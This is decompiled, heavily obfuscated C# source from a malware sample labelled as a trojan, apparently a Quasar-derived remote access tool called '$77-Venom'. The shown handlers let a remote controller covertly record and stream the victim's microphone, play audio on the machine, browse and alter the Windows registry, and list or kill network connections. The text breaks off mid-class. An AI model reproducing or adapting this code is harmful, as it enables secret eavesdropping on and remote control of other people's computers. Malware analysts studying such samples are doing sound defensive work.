// Decompiled with JetBrains decompiler
// Type: 罷Ⅰ㜠䯿꧹湸啈ᘪᖂौ⊗ꞓ㒏㗩⛤
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using NAudio.Wave;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.AForge.Video.DirectShow;
using xClient.Core.NAudio.Wave;
using xClient.Core.NAudio.Wave.WaveInputs;
using xClient.Core.NAudio.Wave.WaveOutputs;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Registry;
using xClient.Core.Utilities;

public static class \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4
{
  public static bool \uE9E7篹帒饼\u1779\u0FDF너\uEA1Bᣴ궔쁸݀评㢏濞渌\uEE92淋嶧漍;
  public static bool 븦䧈瞶翋鳇\uF0DB滴終㠓똜\uF79Aᐇ夿띛撮佔稁\u2F95퉌藢;
  public static 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ 砩沸瘌\uF05E탄\uE699陌\uE2A8绹恓氛㝘\u2237ꤦᯃꉙ寫扸ණꩿ;
  public static int 뎫냧ⴱꊷ썖ၪ㤸\u125Fﾔꠁ楯\uF15C졒\u002Eꕊ䘁뎭\uFFFD\u209E덩;
  public static int 䎻㾭ᾏ䶃讒荰ꐟ擾爵꾃쎄\uFB0Cꇒ\u0EFC棙ꯀ馓ຄ餵\u0C3C;
  public static VideoCaptureDevice 鑃조읅ᨣ波뢦귵\uFFFD鴠\u25F6\uE67D쬃\uEB71\uFFFD\u1C99暇ຝ鹸췭춧;
  public static UnsafeStreamCodec ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4;
  private static Shell \uF679칾\uE7DE\u2E87濱邥\u3319\u2F21珫찐큅嬗ѩ爷\uFFFD썈矗쿨ਔ똿;
  private static Dictionary<int, string> 쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮 = new Dictionary<int, string>();
  private static Dictionary<int, string> 콭\u21BFꮒꔎ艥佡\uFFFD癎\uE2B2\uE3F5\u2361뷒\uE96F䗝\uE4D4骆̨磢\uEE76འ = new Dictionary<int, string>();
  private const string \uF4FF雀諞㳴\u2465猤ཅ蓼豱뱑熄ᷧ矎ᯝ懗\uF49A铺偿蔯\uECAC = "$E$";
  private static readonly System.Threading.Semaphore 坋\u29C4Έ劻䌧愙绷\u2395\u2220啔㰝ꡱ绽憏\uE402\u02FFꖮ霷ೀ鞒 = new System.Threading.Semaphore(2, 2);
  private const string 譄\uFFFD릞ᢣ\uE8A7盟枫혍皟\uA7B8ଌ쫦ꁣ吣\u2E64\u2621יּ쳃ᤑ탨 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random \u26FF졫䦜嘩\u2015\uFFFD恒쭖瘫祫淐᱑阤푑ꈡ\u25CC\uE858揗䌅\u2427 = new Random(Environment.TickCount);

  private static WaveInEvent _waveInEvent { get; set; }

  public static bool StreamRunning { get; set; }

  private static BufferedWaveProvider WaveProvider { get; set; }

  private static WaveOut WaveOut { get; set; }

  public static void \uE7EC\u2EFFႥ流\u220E俊\uE74F\uA7CF魲\u2347胒螑ꔒ嬺ꒈ⁩玾\uFFFD窶\u2FA1(
    GetAudioDevices command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      Dictionary<string, int> audioDevices = new Dictionary<string, int>();
      int deviceCount = WaveIn.DeviceCount;
      for (int devNumber = 0; devNumber < deviceCount; ++devNumber)
      {
        髹\uEC07㣒鶗禺\u2F05貥趣瞥봩载룏빇棵鸮\u2FAB씲磡뉄㙖 capabilities = WaveIn.GetCapabilities(devNumber);
        audioDevices.Add(capabilities.ProductName, capabilities.Channels);
      }
      if (audioDevices.Count <= 0)
        return;
      new GetAudioDevicesResponse(audioDevices).Execute(client);
    }
    catch (Exception ex)
    {
    }
  }

  public static void \u2572溭哔냌蚖ᖧ窵멸餑䔔ﵐ㼛넏쓝㰓緯亃홐餄뷵(
    GetAudioStream command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE120箑\uE26C殤\uF811ቄ㮒沿랃쪔\u2DDF梼ﱴ廅榏Ꚙ\u0383ꂈꉵ\uF20F 箑殤ቄ㮒沿랃쪔梼ﱴ廅榏Ꚙꂈꉵ = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE120箑\uE26C殤\uF811ቄ㮒沿랃쪔\u2DDF梼ﱴ廅榏Ꚙ\u0383ꂈꉵ\uF20F();
    // ISSUE: reference to a compiler-generated field
    箑殤ቄ㮒沿랃쪔梼ﱴ廅榏Ꚙꂈꉵ.ᓘ钿ꗷꞥ\u2FBB帶斥\uF1DF癦ꤕ逥뱫䊆擷\uF3EA陦\uFAFF膮琣ണ = client;
    try
    {
      裞䨖觤㥟㛴먰\uEC41\u136C嵹乢\uE98Cᘁቫ륺끂볃\uF732\uFFFD枽侏 裞䨖觤㥟㛴먰嵹乢ᘁቫ륺끂볃枽侏 = new 裞䨖觤㥟㛴먰\uEC41\u136C嵹乢\uE98Cᘁቫ륺끂볃\uF732\uFFFD枽侏(command.SampleRate, command.Channels);
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4._waveInEvent = new WaveInEvent()
      {
        BufferMilliseconds = 50,
        DeviceNumber = command.Device,
        WaveFormat = 裞䨖觤㥟㛴먰嵹乢ᘁቫ륺끂볃枽侏
      };
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4._waveInEvent.StartRecording();
      // ISSUE: reference to a compiler-generated method
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4._waveInEvent.DataAvailable += new EventHandler<퓎ᾴ㓁䒧囉\uF78A\uF0C4嚑葧\uF759\u2706匠猕\u088E뾜厇铋鮟唏㪢>(箑殤ቄ㮒沿랃쪔梼ﱴ廅榏Ꚙꂈꉵ.蓯ℕ襶ἁ\uE5BD퍁ጽኀ곯팒ꖒ\u2E60\uFFFD\uA9DF硑봻\uFFFD罶泚\uE0D7);
    }
    catch (Exception ex)
    {
    }
  }

  public static void 圮庽\uFFFD핀쎘њ钠鷉焕\u07B3뾝\uE25D떒麶\uE8C4絝\uE508鵾ﭨ逋(
    StopAudioStream command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4._waveInEvent.StopRecording();
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4._waveInEvent.Dispose();
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.StreamRunning = false;
      new StopAudioStreamResponse(\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.StreamRunning).Execute(client);
    }
    catch (Exception ex)
    {
    }
  }

  public static void 褍\u2578簏\u31BD깝䞮䞣䧙\uE897\u330Bᙱ\uE6F0悟뺰멼罙튨绰\u2A79݊(
    DoSpeak command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.WaveOut = new WaveOut();
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.WaveProvider = new BufferedWaveProvider(new 裞䨖觤㥟㛴먰\uEC41\u136C嵹乢\uE98Cᘁቫ륺끂볃\uF732\uFFFD枽侏());
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.WaveOut.Init((ᒅ憁ܳ䥿䣘ꅤ\u288C裬\uF406턉\u2752쉢煫\uF31F\u2B91杔蕨蹯鈭쭫) \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.WaveProvider);
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.WaveProvider.AddSamples(command.SpokenData, 0, command.SpokenData.Length);
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.WaveOut.Play();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 㧆欓ཱི\uE691紋빗䞯\uEE43\uEAC9ꂨ偏팾着\u227E\u2385껤嬌囹\uFFFDഅ(
    DoLoadRegistryKey packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetRegistryKeysResponse registryKeysResponse = new GetRegistryKeysResponse();
    try
    {
      RegistrySeeker registrySeeker = new RegistrySeeker();
      registrySeeker.BeginSeeking(packet.RootKeyName);
      registryKeysResponse.Matches = registrySeeker.Matches;
      registryKeysResponse.IsError = false;
    }
    catch (Exception ex)
    {
      registryKeysResponse.IsError = true;
      registryKeysResponse.ErrorMsg = ex.Message;
    }
    registryKeysResponse.RootKey = packet.RootKeyName;
    registryKeysResponse.Execute(client);
  }

  public static void ⱨ䉑碶ꮾ\u086C輘ᒌ\u2679\uF8F2\uE7D8群\uF6F7헮祃\uFFFD鴯\u0AE4Ũ닂\uF3A9(
    DoCreateRegistryKey packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetCreateRegistryKeyResponse registryKeyResponse = new GetCreateRegistryKeyResponse();
    string errorMsg = "";
    string name = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.CreateRegistryKey(packet.ParentPath, out name, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.Match = new RegSeekerMatch(name, \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.\u2F2E脚妑\uE757贈ἤ̖쮀蔉騱뀖游ﱴ锥\uF7D7뵙篦筷쌬䌱(), 0);
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.Execute(client);
  }

  public static void 햠ᤙ\uF417ⷝꀇ紈\uEB15ΰ㯮\uE419稘徍\uFFFD콞뮾蓩了ꅹ핋壭(
    DoDeleteRegistryKey packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetDeleteRegistryKeyResponse registryKeyResponse = new GetDeleteRegistryKeyResponse();
    string errorMsg = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.KeyName = packet.KeyName;
    registryKeyResponse.Execute(client);
  }

  public static void 粈杝惍뙠喃읺ᶮ栧췏驫폟更\u02DF\uFFFD尖ọ慝箂\u233B\uF3EF(
    DoRenameRegistryKey packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetRenameRegistryKeyResponse registryKeyResponse = new GetRenameRegistryKeyResponse();
    string errorMsg = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.OldKeyName = packet.OldKeyName;
    registryKeyResponse.NewKeyName = packet.NewKeyName;
    registryKeyResponse.Execute(client);
  }

  public static void 决\u26F3瑃\uE5BB갯쬊ᎋꪼ榻哔圙\uE352\u2D2F\uFFFD歂蘻箑쟅夯\uE5C0(
    DoCreateRegistryValue packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetCreateRegistryValueResponse registryValueResponse = new GetCreateRegistryValueResponse();
    string errorMsg = "";
    string name = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out name, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.Value = new RegValueData(name, packet.Kind, packet.Kind.GetDefault());
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Execute(client);
  }

  public static void 힌\u2A64ﳴ랮\uF677\uFFFDଜ縁棶꼧헐ﴥ䉷爳\uE117箺\uFFFD\uF5E2爤셯(
    DoDeleteRegistryValue packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetDeleteRegistryValueResponse registryValueResponse = new GetDeleteRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.ValueName = packet.ValueName;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Execute(client);
  }

  public static void 䠉杝ᜑᡋ챪䳛瀁\u2A0B\uFFFDᬰ\u0F07퓋䕴驽\uA8DAఠ\uE1D1ἢꒊ舙(
    DoRenameRegistryValue packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetRenameRegistryValueResponse registryValueResponse = new GetRenameRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.OldValueName = packet.OldValueName;
    registryValueResponse.NewValueName = packet.NewValueName;
    registryValueResponse.Execute(client);
  }

  public static void \u1948竧惱櫃ㅓ둥\uFFFD雉孱쌥㛄튨ꐳ蜙鎠\uEDBBᗛ\uE44D틟덫(
    DoChangeRegistryValue packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    GetChangeRegistryValueResponse registryValueResponse = new GetChangeRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Value = packet.Value;
    registryValueResponse.Execute(client);
  }

  public static void 埥؁砸\u26B0砎\uFFFD\uECAEᐦ\uEF1A懪퓋Ꞝ닀ꀱ뺑ȸ䢵\u22F2倇侎(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client,
    GetConnections packet)
  {
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판[] 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array = \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.떊ﮅ顦썍\uE195\u2B52黧꩔瑤覸\u27AA뢬ꦍ\u2AC5郝쓥ぁ翈焑鼌();
    string[] processes = new string[좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length];
    string[] localaddresses = new string[좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length];
    string[] localports = new string[좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length];
    string[] remoteadresses = new string[좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length];
    string[] remoteports = new string[좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length];
    byte[] states = new byte[좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length];
    for (int index = 0; index < 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length; ++index)
    {
      localaddresses[index] = 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].LocalAddress.ToString();
      localports[index] = 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].LocalPort.ToString();
      remoteadresses[index] = 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].RemoteAddress.ToString();
      remoteports[index] = 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].RemotePort.ToString();
      states[index] = Convert.ToByte(좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].Ẁ蘌厬㻀\uFFFD鯆\u332D邹팝\uF79B\u3013冤㭃쵈倎䄒官薸ᶵ쏗);
      try
      {
        Process processById = Process.GetProcessById((int) 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].ʥ땏\uEBA5㚵ꮀ\uE7C3\u25A4繭\uEA80쥶\u28BB鬼첇㔉驊ﭘ总钄\uF40Eඑ);
        processes[index] = processById.ProcessName;
      }
      catch
      {
        processes[index] = string.Format("PID: {0}", (object) 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].ʥ땏\uEBA5㚵ꮀ\uE7C3\u25A4繭\uEA80쥶\u28BB鬼첇㔉驊ﭘ总钄\uF40Eඑ);
      }
    }
    new GetConnectionsResponse(processes, localaddresses, localports, remoteadresses, remoteports, states).Execute(client);
  }

  public static void \uFFFD䒵牕翁巆\u0899\uE4A1\uEB76\uFADC䟐䶃\uEC42\uEA99ȑ樌鮳ʮ혢뤒랐(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client,
    DoCloseConnection packet)
  {
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판[] 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array = \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.떊ﮅ顦썍\uE195\u2B52黧꩔瑤覸\u27AA뢬ꦍ\u2AC5郝쓥ぁ翈焑鼌();
    bool flag = false;
    for (int index = 0; index < 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array.Length; ++index)
    {
      int num1 = packet.LocalPort;
      string str1 = num1.ToString();
      ushort num2 = 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].LocalPort;
      string str2 = num2.ToString();
      if (str1 == str2)
      {
        num1 = packet.RemotePort;
        string str3 = num1.ToString();
        num2 = 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].RemotePort;
        string str4 = num2.ToString();
        if (str3 == str4)
        {
          flag = true;
          좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index].Ẁ蘌厬㻀\uFFFD鯆\u332D邹팝\uF79B\u3013冤㭃쵈倎䄒官薸ᶵ쏗 = 12U;
          IntPtr num3 = Marshal.AllocCoTaskMem(Marshal.SizeOf((object) 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index]));
          Marshal.StructureToPtr((object) 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index], num3, false);
          \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.銪硍ʌ쟺츠힛\uE785ꤤ귓씖市碮ꞓ掠텗\u4DC7퀝뿰䶞叕(num3);
        }
      }
    }
    if (!flag)
      return;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.埥؁砸\u26B0砎\uFFFD\uECAEᐦ\uEF1A懪퓋Ꞝ닀ꀱ뺑ȸ䢵\u22F2倇侎(client, new GetConnections());
  }

  public static \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판[] 떊ﮅ顦썍\uE195\u2B52黧꩔瑤覸\u27AA뢬ꦍ\u2AC5郝쓥ぁ翈焑鼌()
  {
    int ipVersion = 2;
    int dwOutBufLen = 0;
    int num1 = (int) \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.貿뷝ួㄽ귡첡舎꘥\u0D5Bഺ쏀애ᳪ깎阹鲌丼雝㦫讶(IntPtr.Zero, ref dwOutBufLen, true, ipVersion, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE809ℙ櫄艚Ⱘ嫄ᱦ䘼\u2F5E恢ءꃐȯ\uFFFD븨辬뭆脆鳎莳.\uFFFD팈뾄\u228F㝛撮叽齠\u22A2鞕ꬱ賳क繁\uEE5C檵\u2E2A\uEAF2뚬\uE2B2);
    IntPtr num2 = Marshal.AllocHGlobal(dwOutBufLen);
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판[] 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array;
    try
    {
      if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.貿뷝ួㄽ귡첡舎꘥\u0D5Bഺ쏀애ᳪ깎阹鲌丼雝㦫讶(num2, ref dwOutBufLen, true, ipVersion, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uE809ℙ櫄艚Ⱘ嫄ᱦ䘼\u2F5E恢ءꃐȯ\uFFFD븨辬뭆脆鳎莳.\uFFFD팈뾄\u228F㝛撮叽齠\u22A2鞕ꬱ賳क繁\uEE5C檵\u2E2A\uEAF2뚬\uE2B2) != 0U)
        return (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판[]) null;
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.㬟\uE22B埘뫭e伎\uF099\uF46B䐒㽍厺灚掄庪೯溿䌀뚴闪\uFFFD structure1 = (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.㬟\uE22B埘뫭e伎\uF099\uF46B䐒㽍厺灚掄庪೯溿䌀뚴闪\uFFFD) Marshal.PtrToStructure(num2, typeof (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.㬟\uE22B埘뫭e伎\uF099\uF46B䐒㽍厺灚掄庪೯溿䌀뚴闪\uFFFD));
      IntPtr ptr = (IntPtr) ((long) num2 + (long) Marshal.SizeOf((object) structure1.㲿ꅱ\u2B29娄唗惼ꧭ讼９깍అꉯ떅侤頂\uE9A3\uFFFD牶\u2080慌));
      좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판[(int) structure1.㲿ꅱ\u2B29娄唗惼ꧭ讼９깍అꉯ떅侤頂\uE9A3\uFFFD牶\u2080慌];
      for (int index = 0; (long) index < (long) structure1.㲿ꅱ\u2B29娄唗惼ꧭ讼９깍అꉯ떅侤頂\uE9A3\uFFFD牶\u2080慌; ++index)
      {
        \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판 structure2 = (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판) Marshal.PtrToStructure(ptr, typeof (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판));
        좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array[index] = structure2;
        ptr = (IntPtr) ((long) ptr + (long) Marshal.SizeOf((object) structure2));
      }
    }
    finally
    {
      Marshal.FreeHGlobal(num2);
    }
    return 좢쀧㱽栕뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱판Array;
  }

